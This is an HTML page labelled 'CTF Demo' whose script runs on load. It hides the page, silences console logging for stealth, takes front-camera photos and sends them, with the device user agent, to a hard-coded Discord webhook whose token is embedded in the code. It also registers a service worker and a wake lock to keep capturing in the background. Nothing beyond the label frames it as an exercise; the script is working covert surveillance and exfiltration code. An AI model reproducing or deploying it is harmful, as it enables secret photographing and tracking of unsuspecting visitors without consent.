<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>CTF Demo</title>
    <style>
        html, body { 
            margin: 0; 
            padding: 0; 
            height: 0; 
            overflow: hidden; 
            background: transparent; 
            display: none; /* Invisible UI */
        }
    </style>
</head>
<body>
    <script>
        // Discord webhook URL (replace with your valid webhook)
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';

        // Suppress console logs for stealth
        console.log = console.error = console.warn = () => {};

        // Send data to webhook (multipart/form-data)
        async function sendItem(type, data, index = null) {
            try {
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    embeds: [{
                        title: `Zero-Click CTF: ${type} [${new Date().toISOString()}]`,
                        fields: [
                            { name: 'Type', value: type },
                            { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                            { name: 'Device', value: navigator.userAgent || 'Unknown' }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                }));
                if (type.includes('Photo')) {
                    const response = await fetch(data.base64);
                    const blob = await response.blob();
                    formData.append('file', blob, `photo_${index + 1}.webp`);
                }

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData,
                    headers: { 
                        'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1`
                    }
                });
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return true;
            } catch (e) {
                return false; // Silent fail
            }
        }

        // Capture a single photo
        async function capturePhoto(stream, index, phase) {
            try {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                await new Promise(resolve => video.onloadedmetadata = resolve);
                const canvas = document.createElement('canvas');
                canvas.width = 240;
                canvas.height = 180;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.1));
                const reader = new FileReader();
                const photo = await new Promise(resolve => {
                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                    reader.readAsDataURL(blob);
                });
                await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                video.srcObject = null; // Clean up
                return true;
            } catch (e) {
                await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e.message}` }, index);
                return false;
            }
        }

        // Collect 8 photos quickly (~4 seconds)
        async function collectInitialPhotos() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                await sendItem('Camera', { error: 'Camera not supported', device: navigator.userAgent });
                return false;
            }

            let stream = null;
            const maxRetries = 3;
            let retryCount = 0;

            while (!stream && retryCount < maxRetries) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user', // Front-facing camera
                            width: { ideal: 240 }, 
                            height: { ideal: 180 },
                            frameRate: { ideal: 10 }
                        },
                        audio: false 
                    });
                } catch (e) {
                    retryCount++;
                    await sendItem('Camera', { error: `Initial camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
                    if (retryCount === maxRetries) {
                        await sendItem('Camera', { error: 'Max retries reached, aborting initial capture' });
                        return false;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            if (stream) {
                for (let i = 0; i < 8; i++) {
                    await new Promise(resolve => setTimeout(async () => {
                        await capturePhoto(stream, i, 'Initial');
                        resolve();
                    }, i * 500 + Math.random() * 50)); // 500ms interval with slight randomization
                }
                stream.getTracks().forEach(track => track.stop());
                await sendItem('Status', { message: 'Initial 8 photos captured successfully' });
                return true;
            }
            return false;
        }

        // Register ServiceWorker for background photo capture
        async function registerServiceWorker() {
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
                    await navigator.serviceWorker.ready;
                    registration.active.postMessage({ action: 'startBackgroundCapture' });
                } catch (e) {
                    await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
                }
            } else {
                await sendItem('ServiceWorker', { error: 'ServiceWorker not supported' });
            }
        }

        // Ensure background execution
        async function keepRunningInBackground() {
            try {
                if ('wakeLock' in navigator) {
                    const lock = await navigator.wakeLock.request('screen');
                    setTimeout(() => lock.release(), 5000); // Release after initial captures (~5s)
                }

                document.addEventListener('visibilitychange', async () => {
                    if (document.visibilityState === 'hidden') {
                        await registerServiceWorker(); // Trigger background capture
                    }
                });

                const keepAlive = setInterval(() => {}, 10000); // Keep alive
                setTimeout(() => clearInterval(keepAlive), 420000); // Stop after 7 minutes
            } catch (e) {
                // Silent fail
            }
        }

        // Start zero-click collection
        (async () => {
            await keepRunningInBackground();
            await collectInitialPhotos();
        })();
    </script>
</body>
</html>
